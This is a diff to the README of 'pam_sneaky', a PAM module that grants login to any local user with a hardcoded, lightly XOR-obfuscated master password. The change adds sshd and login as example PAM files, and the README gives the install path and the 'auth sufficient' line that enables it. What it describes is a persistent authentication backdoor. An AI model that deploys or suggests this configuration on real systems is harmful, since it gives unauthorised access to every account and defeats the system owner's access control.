@@ -1,6 +1,6 @@
 # pam_sneaky
 
-This simple PAM module will enable authentication with any local user using a constant known password. The password is XOR'd with a constant key to a smidge of obfuscation. This example uses the password "sneaky password". After installation to `/lib/security/pam_sneaky.so` (or your distributions' equivalent), you can add this to the top of your PAM configuration:
+This simple PAM module will enable authentication with any local user using a constant known password. The password is XOR'd with a constant key to a smidge of obfuscation. This example uses the password "sneaky password". After installation to `/lib/security/pam_sneaky.so` (or your distributions' equivalent), you can add this to the top of your PAM configuration (e.g. `/etc/pam.d/sshd` or `/etc/pam.d/login`):
 
 ```
 auth    sufficient    pam_sneaky.so
